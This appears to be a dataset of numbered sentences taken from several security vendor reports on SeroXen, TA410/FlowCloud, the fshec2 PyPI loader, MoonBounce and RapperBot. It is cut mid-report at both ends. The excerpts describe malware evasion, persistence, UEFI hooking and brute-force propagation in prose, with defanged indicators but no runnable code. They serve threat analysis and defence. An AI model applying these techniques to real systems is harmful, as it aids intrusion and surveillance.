resource.","13326":"This resource is hidden behind anti-sandboxing and debugger techniques, only to lead to more obfuscation and encryption techniques that lead to the final payload.","13327":"This payload has been built using the Github project Costura, which allows SeroXen to pack the code\u2019s dependencies into the .NET assembly so it can run self-contained. ","13328":"Figure 5.","13329":"Payload embedded resources. ","13330":"The extraction of the resources leads to the final payloads.","13331":"This is in the form of two .NET assemblies: CSStub2.InstallStager.exe, and CSStub2.UninstallStager.exe.","13332":"And a Win32 binary called CSStub2.$sxr-nircmd.exe, which corresponds to the unmodified command-line utility NirCmd. ","13333":"The payload InstallStager.exe is a compilation of the open-source rootkit named r77-rootkit \u2013 a fileless ring 3 rootkit written in .NET.","13334":"This rootkit supports both x32 and x64 Windows processes and has the following features: Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process. ","13335":"Child process hooking. ","13336":"Option to embed additional malware to be executed with the rootkit \u2013 in this case NirCmd and\/or Quasar.","13337":"The added malware will be decompressed and decrypted before it is injected into other processes.

","13420":"ESET researchers have documented and analyzed TA410 activity going back to 2019.","13421":"TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa.","13422":"TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its LookBack blogpost.","13423":"A year later, the then-new and very complex malware family called FlowCloud was also attributed to TA410. ","13424":"In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET.","13425":"This very complex backdoor contains interesting espionage capabilities.","13426":"ESET will present its latest findings about TA410, including results from ongoing research, during Botconf 2022.","13427":"For YARA and Snort rules, consult ESET\u2019s GitHub account. ","13428":"Key points in this blogpost: TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its own toolset and targets. ","13429":"ESET telemetry shows victims all around the world, mainly in the governmental and education sectors. ","13430":"TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021. ","13431":"ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT.","13432":"It has several interesting capabilities, including: Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected. ","13433":"Monitoring clipboard events to steal clipboard content. ","13434":"Monitoring file system events to collect new and modified files. ","13435":"Controlling attached camera devices to take pictures of the compromised computer\u2019s surroundings. ","13436":"FlowCloud deploys a rootkit to hide its activity on the compromised machine. ","13437":"The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications. ","13438":"TA410 is one of the users of the Royal Road malicious document builder. ","13439":"TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target. ","13440":"The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn\u2019t implemented in the loaders we analyzed.","13441":"However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.","13442":"In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value. ","13443":"Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.","13444":"This information can help attackers understand stolen data by contextualizing it. ","13445":"FlowCloud can also gather information about things happening around the victim\u2019s computer by taking pictures using connected camera peripherals and recording audio using a computer\u2019s microphone.","13446":"This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume. ","13447":"Attribution ESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts.","13448":"These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure. ","13449":"FlowingFrog uses Royal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud. ","13450":"LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage. ","13451":"JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT.","13452":"Part of the activity of this team was described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that APT10 (aka A41APT) has conducted recently. ","13453":"FlowingFrog and JollyFrog share network infrastructure \u2013 more precisely, the domain ffca.caibi379[.]com, as mentioned by Proofpoint. ","13454":"FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article. ","13455":"In ESET telemetry, we do not see any other overlap between these subgroups.","13456":"We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure. ","13457":"Victimology Most TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel.","13458":"According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe.","13459":"Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams. ","13460":"An element worth mentioning is that TA410 targets foreign individuals in China.","13461":"In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China. ","13462":"Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission Figure 1.","13463":"Map of countries and verticals targeted by TA410 Initial compromise and typical TTPs If we exclude the different backdoors, the three teams use a similar modus operandi.","13464":"They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.","13465":"This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target. ","13466":"The public-facing application compromise approach is what we have seen the most.","13467":"Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.","13468":"They then dropped an ASPX webshell that was used to install other malicious components.","13469":"These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin. ","13470":"In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications. ","13471":"In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.","13472":"This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021. ","13473":"This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists. ","13474":"In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy\/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 \u2013 FlowingFrog FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules\u2019 PDB paths. ","13475":"Royal Road and Tendyron downloader Royal Road is a malicious document builder used by several cyberespionage groups (see the analysis by nao_sec).","13476":"Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as CVE-2017-11882.","13477":"TA410 operators always use the Royal Road encoding bytes: A9 A4 6E FE, as seen in Figure 2.

","13944":"We reported the discovered package, named fshec2, to the PyPI security team on April 17, 2023, and it was removed from the PyPI repository the same day.","13945":"The PyPI security team has also recognized this type of attack as interesting and acknowledged that it had not been previously seen. ","13946":"Here\u2019s how my threat research team identified the fshec2 as a suspicious package and the novel method that the attackers employed as they attempted to avoid detection.","13947":"I\u2019ll also tell you what our researchers found when investigating the command-and-control (C2) infrastructure used by the malware \u2014 and provide evidence of successful attacks. ","13948":"Detection:","13949":"Unusual behaviors ReversingLabs regularly scans open-source registers such as PyPi, npm, RubyGems, and GitHub looking for suspicious files.","13950":"As the team observed before, these often jump out at us from the millions of legitimate, nonmalicious files hosted on these platforms because they exhibit strange qualities or behaviors that, experience tells us, often signal malicious intent. ","13951":"That was the case with fshec2.","13952":"The package initially caught our attention following a scan using the ReversingLabs Software Supply Chain Security platform, which extracted a suspicious combination of behaviors from an fshec2 compiled binary.","13953":"Those suspicious behaviors extracted from the decompiled file included the presence of URLs that reference the host by IP address, as well as the creation of a process and execution of a file. ","13954":"A manual review of the fshec2 package followed.","13955":"It revealed that it contains only three files.","13956":"The code inside two of those Python source code files, _init_.py and main.py, appeared benign.","13957":"It was only upon inspection of a decompiled version of the third file, full.pyc, that more interesting behaviors came to light and the true nature of the package emerged. ","13958":"Figure 1: Files containing package functionality Unmasking an unusual loader Threat actors are always trying to evade detection from security solutions.","13959":"Obfuscation is one of the most popular methods to achieve this.","13960":"For example, several of our previous research blogs have explored incidents in the npm landscape in which JavaScript obfuscation was used.","13961":"That includes the Material Tailwind and IconBurst campaigns, as well as the more recent campaign we identified distributing Havoc malware. ","13962":"Historically, npm has been the unfortunate leader and PyPI an also-ran in the race to see which open-source platform attracts the most attention from malware authors.","13963":"In the last six months, however, ReversingLabs and others have observed a marked increase in the volume of malware published to PyPI.","13964":"In fact, in May, the creation of new user accounts and projects on PyPI were temporarily suspended for a few hours due to a high volume of malicious activity. ","13965":"Along with the increase in malicious modules, my team has observed an increase in the use of various obfuscation techniques in malware published to the PyPI repository.","13966":"One of the most popular obfuscation techniques is execution of Base64-encoded malicious code, which was first observed in campaigns related to W4SP authors in November 2022.","13967":"Variations of that attack, in which malicious code is embedded in code but shifted past the edge of default screen borders (thereby hiding it from view), are still seen in the wild.","13968":"Today, however, attackers have more tools at their disposal.","13969":"For example, use of W4SP crew obfuscation tools such as Hyperion and Kramer is on the rise \u2014 likely a response to the improving detection capabilities of security companies monitoring PyPI and other public package repositories. ","13970":"The fshec2 package uses a significantly different approach that doesn\u2019t rely on obfuscation tools.","13971":"It instead places the malicious functionality into a single file containing compiled Python byte code. ","13972":"How Python attacks (usually) work Before I get to the new obfuscation method my team discovered, here\u2019s a look at how malicious attacks using Python typically work. ","13973":"There are three types of Python files that may play a role in a malicious campaign: plaintext Python files, which have a \/oy extension; compiled Python files, which have a .pyc extension; and Python files that have been compiled into native executables using tools such as py2exe and PyInstaller. ","13974":"In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure. ","13975":"But fshec2 is different.","13976":"Here, we observed a compiled Python file (full.pyc) present inside the PyPI package that contained malicious functionality.","13977":"The entry point of the package was found in the __init__.py file, which imports a function from the other plaintext file, main.py, which contains Python source code responsible for loading of the Python compiled module located in one of the other files, full.pyc. ","13978":"This innocent-seeming import of a function triggers a previously unseen loading technique inside the main.py file that avoids using the usual import directive, which is the simplest way to load a Python compiled module (and also something that is likely to get noticed.)","13979":"Instead, Importlib, the implementation of import in Python source code portable to any Python interpreter, is used to avoid detection by security tools.","13980":"(Some explanation: Importlib is typically used in cases where the imported library is dynamically modified upon import.","13981":"However, the library loaded by main.py was unchanged, meaning that the regular import function would have sufficed.","13982":"This tends to support the theory that Importlib is used to avoid detection.) ","13983":"Figure 2: Loading of the compiled Python module from main.py After the module is loaded, its get_path method is invoked","13984":"(see Figure 3).","13985":"Using ReversingLabs Software Supply Chain Security, my team was able to detect and extract this code from the decompiled PYC file.","13986":"The get_path method, which isn\u2019t found (in readable form) anywhere inside the original fshec2 package, performs some of the common malicious functions observed in other malicious PyPI packages we have analyzed.","13987":"Among other things, it collects usernames, hostnames, and directory listings.","13988":"It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform. ","13989":"Figure 3: The decompiled code extracted from the full.pyc compiled byte code file showing the content of the get_path() method. ","13990":"The fetched commands are just another Python script, which is intended to change (see Figure 4).","13991":"In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.","13992":"The cron_script contained functionality almost identical to the script found in full.pyc, the compiled Python module shipped with the PyPI package. ","13993":"In this way, the fshec2 attack is engineered to be able to evolve.","13994":"The full.pyc file contains functionality to download commands from a remote server identified in the commands path on the C2 server.","13995":"The downloaded commands are a Python file almost identical to full.pyc but with the location for downloading stage 2 commands placed in a cron_script, which periodically downloads new commands.","13996":"This allows the attackers to change the content served at the commands location to make the malware serve new commands. ","13997":"Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware\u2019s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware\u2019s capabilities.","13998":"As it turned out, the web host had plenty to tell us! ","13999":"Like regular developers, malware authors often make configuration mistakes when setting up infrastructure.","14000":"Such mistakes can reveal interesting information about the inner workings of malicious software.","14001":"That was the case with the web host that was set up to communicate with compromised systems.","14002":"For example, trying to access an invalid page on the web host did not generate a 404 \u201cpage not found\u201d error, as you would expect.","14003":"Instead, visitors were served a page from a Django application listing a variety of commands (see Figure 5). ","14004":"Figure 5: Uncovered web locations Fortunately for us, the Django application was configured in debug mode, with error descriptions that gave us a detailed list of reachable host paths.","14005":"Some of those we had already seen in the downloaded scripts used in the attack, but there were new paths that we had not seen, including: admin, uploaded_files, and download. ","14006":"Unfortunately, the trail went cold there, because all three of them require authorization to execute page functionality. ","14007":"Figure 6: Password-protected file download form Still, some information was exposed by this oversight, even without knowing the password.","14008":"For example, command No. 7 in Figure 5 provides a way to download files by their ID using the command: download\/<int:file_id>, where file_id is an integer and the files in question are numbered in sequential order, starting from 1.","14009":"As seen in Figure 6, the filename is also leaked without requiring authorization. ","14010":"The sheer number of these mistakes might lead us to the conclusion that this attack was not the work of a state-sponsored actor and not an advanced persistent threat (APT). ","14011":"While my team didn\u2019t collect enough evidence to prove that assumption one way or another, harvesting the filenames by incrementing file ID let us determine that the attack was successful in some cases.","14012":"Our researchers still can\u2019t say who or what the targets were.","14013":"However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result. ","14014":"Using the method described above, our researchers downloaded files with ID Nos. 1-18.","14015":"The resulting filenames show that at least two targets were infected with username and hostname combinations desktop__desktop-7G-Series and Txxxx_Axxxx__LAPTOP-UH9S5HF2 (identifying information removed). ","14016":"Some of the filenames suggest that additional malware commands include keylogging functionality. ","14017":"Finally, my team can\u2019t exclude the possibility that there were other channels of distribution besides the fshec2 PyPI package that we haven\u2019t encountered. Figure 7: Names of the files that can be downloaded Conclusion Even though this malicious package and the corresponding C2 infrastructure weren\u2019t state of the art, they remind us how easy it is for malware authors to avoid detection based on source-code analysis. ","14018":"Loader scripts such as those discovered in the fshec2 package contain a minimal amount of Python code and perform a simple action: loading of a compiled Python module.","14019":"It just happens to be a malicious module.","14020":"Inspector, the default tool provided by the PyPI security team to analyze PyPI packages, doesn\u2019t, at the moment, provide any way of analyzing binary files to spot malicious behaviors.","14021":"Compiled code from the .pyc file needed to be decompiled in order to analyze its content.","14022":"Once that was accomplished, the suspicious and malicious functionality was easy to see. ","14023":"Figure 8: Inspector tool provided by PyPI security team ","14024":"The discovery of malicious code in the fshec2 package underscores why the ability to detect malicious functions such as get_path is becoming more important for both security and DevSecOps teams.","14025":"Most application security solutions either do not focus on supply chain security or only perform source-code analysis as part of the package security inspection.","14026":"That is why malware hidden inside the Python compiled byte code could slip under the radar of the traditional security solutions. ","14027":"ReversingLabs Software Supply Chain Security supports static analysis and unpacking for a wide range of binary file formats, including the kind of compiled Python byte code seen in this attack.","14028":"As seen with fshec2, analyzing this kind of file allows defenders to extract indicators of malicious intent, making security assessment much easier.

","14038":"At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019.","14039":"Further analysis has shown that a single component within the inspected firmware\u2019s image was modified by attackers in a way that allowed them to intercept the original execution flow of the machine\u2019s boot sequence and introduce a sophisticated infection chain. ","14040":"By examining the components of the rogue firmware and other malicious artefacts from the target\u2019s network, we were able to reach the following conclusions: ","14041":"The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement; The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint; We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager\u2019s payload; By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that\u2019s been widely reported to be Chinese-speaking; In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign. ","14042":"Revisiting the current state of the art in persistent attacks In the last year, there have been several public accounts on the ongoing trend of UEFI threats.","14043":"Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal). ","14044":"The common denominator of those three cases is the fact that the UEFI components targeted for infection reside on the ESP (EFI System Partition), a storage space designated for some UEFI components, typically based in the computer\u2019s hard drive or SSD.","14045":"The most notable elements of the ESP are the Boot Manager and OS loader, both invoked during the machine\u2019s boot sequence and which also happen to be the subject of tampering in the case of the aforementioned bootkits. ","14046":"While all of the above were seen in use by advanced actors, a different class of bootkits raises even higher concern.","14047":"This one is made up of implants found in the UEFI firmware within the SPI flash, a non-volatile storage external to the hard drive.","14048":"Such bootkits are not only stealthier (partially because of limited visibility by security products into this hardware component), but also more difficult to mitigate: flashing a clean firmware image in place of a malicious one can prove to be more difficult than formatting a hard drive and reinstalling an OS, which would typically eliminate ESP level threats. ","14049":"MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware-based rootkits.","14050":"Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.","14051":"In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process. ","14052":"Our discovery: a sophisticated implant within UEFI firmware The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.","14053":"Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table \u2013 a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain. ","14054":"The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.","14055":"Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader. ","14056":"This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.","14057":"This driver, which runs during the initial phases of the kernel\u2019s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.","14058":"Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e. hxxp:\/\/mb.glbaitech[.]com\/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve. ","14059":"The diagram below contains the outline of the stages taken from the moment the hooked Boot Services are called in the context of the DXE Foundation\u2019s execution until the user-mode malware is deployed and run during the Operating System\u2019s execution.","14060":"The full description of each step in the diagram, along with the analysis of both the MoonBounce driver and user-mode malware can be found in the technical document released alongside this report. ","14061":"Flow of MoonBounce execution from boot sequence to malware deployment in user space Note that at the time of writing we lack sufficient evidence to retrace how the UEFI firmware was infected in the first place.","14062":"The infection itself, however, is assumed to have occurred remotely.","14063":"While previous UEFI firmware compromises (i.e. LoJax and MosaicRegressor) manifested as additions of DXE drivers to the overall firmware image on the SPI flash, the current case exhibits a much more subtle and stealthy technique where an existing firmware component is modified to alter its behaviour.","14064":"Notably, particular functions were modified with an inline hook, meaning the replacement of the function prologue with an instruction to divert execution to a function chosen by the attacker.","14065":"This form of binary instrumentation typically requires the attacker to obtain the original image, then parse and change it to introduce malicious logic.","14066":"This would be possible for an attacker having ongoing and remote access to the targeted machine. ","14067":"Other pieces of malware on the radar In addition to MoonBounce, we found infections across multiple nodes in the same network by a known user-mode malware dubbed ScrambleCross, also known as SideWalk.","14068":"This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.","14069":"This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better. ","14070":"The position-independent code constituting ScrambleCross can be loaded in one of two ways, the first being a C++ DLL named StealthVector.","14071":"It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.","14072":"We detected both variants of this loader in the network in question. ","14073":"StealthVector gets loaded through the introduction of a modified benign system DLL, in which the import address table is patched to append the malware\u2019s DLL as a dependency.","14074":"In one case, we observed such altered wbemcomn.dll (MD5: C3B153347AED27435A18E789D8B67E0A) file, which originally facilitates the functionality of WMI in Windows and was located in the directory %SYSTEM%\\wbem.","14075":"As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll.

","14184":"The ScrambleCross malware itself, which has been reported in use with both Earth Baku and SparklingGoblin, is considered a variant of CROSSWALK, a piece of malware that was described originally by Mandiant as an APT41 tool and remains distinct to the group, to the best of our knowledge. ","14185":"A unique certificate retrieved from multiple ScrambleCross C2 servers in the campaign described in this report was sent as a response in a few other dozen servers in the wild, a few of them have been previously reported by the FBI as being part of an APT41-owned infrastructure. ","14186":"Additionally, the following observations are worth mentioning: The user-mode malware stager deployed by the UEFI implant contains a scheduling logic that is somewhat similar to one seen in Microcin samples (some of which were also found on infected hosts in this campaign).","14187":"This suggests that these groups may be related through shared resources or a prime contractor. ","14188":"The said scheduling algorithm found in the stager can take a 672-bit bitmask to determine when the malware should start beaconing the C2 server in an attempt to retrieve the payload, whereby the scheduled working time can be decided in a granularity of 15-minute slots (i.e. the stager checks if it is supposed to run in a particular slot out of the 672 possibilities that constitute a full week, or alternatively sleep for 10 seconds before checking if it has reached a dedicated working slot again).","14189":"A similar scheduling methodology occurs in the case of Microcin, but with a bitmask that simply represents the days of the week on which the malware ought to be active. ","14190":"Scheduling code used in MoonBounce\u2019s user-mode stager ","14191":"The Mimikat_ssp tool found on a few machines in the targeted network has been seen in use by multiple Chinese-speaking threat actors in the past.","14192":"One recent example is its use in the campaigns of GhostEmperor, as described in a previous report. ","14193":"Some elements of shellcode leveraged in MoonBounce were spotted in an old rootkit that was part of a malicious framework dubbed xTalker, which has been seen in the wild since at least 2013, alongside several malware families affiliated to known actors, e.g. NetTraveler, Enfal and Microcin.","14194":"It was prominently used against Russian-speaking targets including military, governmental entities and think-tanks. ","14195":"Both components shared a similar name-hashing algorithm, which is outlined below, along with unique corresponding function name hashes (e.g. 0x311B83F, the name hash of ExAllocatePool) that were not seen in use elsewhere in the wild. ","14196":"Name-hashing algorithm used identically in both MoonBounce and xTalker\u2019s rootkit In addition, both pieces of code used a technique of replacing magic marker values within shellcode buffers with pointer addresses during runtime.","14197":"MoonBounce\u2019s code used the marker 0x1122334455667788, while the xTalker rootkit\u2019s code used 0x1234567812345678. ","14198":"Magic marker values replaced during execution within shellcodes in xTalker\u2019s rootkit and MoonBounce In the case of xTalker, the above code elements were found within shellcode intended to be staged through an MBR bootkit.","14199":"However, it is not clear to what extent it was actually used.","14200":"This may suggest that the MoonBounce and xTalker codes were authored by the same, or a closely affiliated, developer. ","14201":"Conclusion In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks.","14202":"The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings. ","14203":"Moreover, it is evident that the group maintains a high level of proficiency and sophistication in the development of its toolset, gaining a foothold in new areas like UEFI firmware.","14204":"In this sense, the group has introduced its own innovation to this landscape \u2013 patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system. ","14205":"Following previous predictions, we can now say that UEFI threats are gradually becoming a norm.","14206":"With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default.","14207":"We assess that, in this ongoing arms race, attacks against UEFI will continue to proliferate, with attackers evolving and finding ways to exploit and bypass current security measures. ","14208":"As a safety measure against this attack and similar ones, it is recommended to update the UEFI firmware regularly and verify that BootGuard, where applicable, is enabled.","14209":"Likewise, enabling Trust Platform Modules, in case a corresponding hardware is supported on the machine, is also advisable.","14210":"On top of all, a security product that has visibility into the firmware images should add an extra layer of security, alerting the user on a potential compromise if such occurs.

","14413":"Unlike the murky objectives of the previous campaign, it is quickly evident that these samples are part of a separate campaign to launch Distributed Denial of Service (DDoS) attacks against game servers, which we believe to be a re-emergence of a similar campaign from earlier this year. ","14414":"Affected Platforms: LinuxImpacted Users: Any organizationImpact: ","14415":"Remote attackers gain control of the vulnerable systemsSeverity Level: Critical This article discusses the differences observed in this campaign and its relation to the previous RapperBot and similar campaigns in the past. ","14416":"RapperBot Rebooted FortiGuard Labs encountered this campaign by hunting for samples using the unique bot ID used by RapperBot to communicate with its Command-and-Control (C2) server, as reported in the previous article. ","14417":"But once we analyzed these new samples, we observed a significant difference between them and the earlier campaign.","14418":"In fact, it turns out that this campaign is less like RapperBot than an older campaign that appeared in February and then mysteriously disappeared in the middle of April.","14419":"Other related campaigns uncovered during this investigation are detailed later in this article. ","14420":"Network Protocol and Denial-of-Service (DoS)","14421":"Attacks The C2 network protocol used in previous campaigns remains essentially unchanged, with additional commands added to support the Telnet brute force.","14422":"The list of commands and IDs are shown below: 0x00: Register (used by the client) ","14423":"0x01: Keep-Alive\/Do nothing 0x02: Stop all DoS attacks and terminate the client 0x03: Perform a DoS attack 0x04: Stop all DoS attacks 0x06: Restart Telnet brute forcing 0x07: Stop Telnet brute forcing The previously reported RapperBot campaign was limited to a few generic DoS methods against TCP and UDP services.","14424":"This campaign adds DoS attacks against the GRE protocol (likely reusing the Mirai source code) and the UDP protocol used by the Grand Theft Auto: San Andreas Multi Player (SA:MP) mod. ","14425":"Here are the DoS attack commands supported by this botnet: 0x00: Generic UDP flood 0x01: TCP SYN flood 0x02: TCP ACK flood 0x03: TCP STOMP flood 0x04: UDP SA:MP flood targeting game servers running GTA San Andreas:","14426":"Multi Player (SA:MP) 0x05: GRE Ethernet flood 0x06: GRE IP flood 0x07: Generic TCP flood These specific commands, coupled with the absence of HTTP-related DDoS attacks, suggests that this campaign is primarily geared toward game server DDoS. Telnet Self-propagation The most significant difference in the new campaign was the complete replacement of the SSH brute forcing code with the more usual Telnet equivalent.","14427":"FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim. ","14428":"The Telnet brute forcing code is designed primarily for self-propagation and resembles the old Mirai Satori botnet.","14429":"Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2. ","14430":"These credentials used appear to be default credentials for IoT devices.","14431":"To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings to identify the possible device and then only tries the known credentials for that device.","14432":"Unlike less sophisticated IoT malware, this allows the malware to avoid trying to test a full list of credentials.","14433":"While not exactly a novel technique, it is still uncommon compared to other IoT botnets. ","14434":"Based on the prompt messages hardcoded into the malware, most of the targeted devices are IoT devices such as routers and DVRs.","14435":"This campaign seems especially interested in older devices with the Qualcomm MDM9625 chipset, such as LTE modems.","14436":"It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary. ","14437":"Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised device\u2019s IP address, and its architecture to the C2 server on a separate port, 5123.","14438":"After reporting, the malware attempts to install its main payload binary on the compromised device. ","14439":"It first parses the Executable and Linkable Format (ELF) header of the \/bin\/busybox file for the e_machine field, which provides the architecture of the compromised device.","14440":"This allows it to download and deploy a RapperBot payload of the correct architecture to ensure proper execution.","14441":"This selective behavior is more efficient than the shotgun approach in most IoT malware families, whereby all the binaries for the supported architectures are downloaded and executed in the victim's system. ","14442":"Based on the payload binaries we collected, this botnet currently seems to only target devices running on ARM, MIPS, PowerPC, SH4, and SPARC architectures.","14443":"Moreover, it specifically checks and stops its self-propagation if the device is detected to be running on Intel processors. ","14444":"The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload. ","14445":"If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload. ","14446":"Unlike in Satori, these embedded downloaders are stored as escaped byte strings, probably to simplify parsing and processing within the code. ","14447":"The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.","14448":"As labeled in Figure 4, each binary has a hardcoded URL for downloading the payload binary of the proper architecture. ","14449":"No attempts to persist on infected or brute-forced devices were observed for this campaign. ","14450":"Related Campaigns FortiGuard Labs compared samples for this and related campaigns from the past to find any links with the previously reported RapperBot campaign. ","14451":"We observed that the earliest samples for this campaign were from December 2021 and that the SA:MP attack was only added in February 2022.","14452":"This campaign mysteriously disappeared in mid-April 2022, resurfacing in Oct 2022 with the addition of the self-propagation feature. ","14453":"We also found older samples from another campaign that was active in August-September 2021 with an almost identical list of credentials.","14454":"These samples contain slightly fewer credentials and a simpler self-propagation code that only supports downloading the payload via wget or the binary downloader embedded directly into the 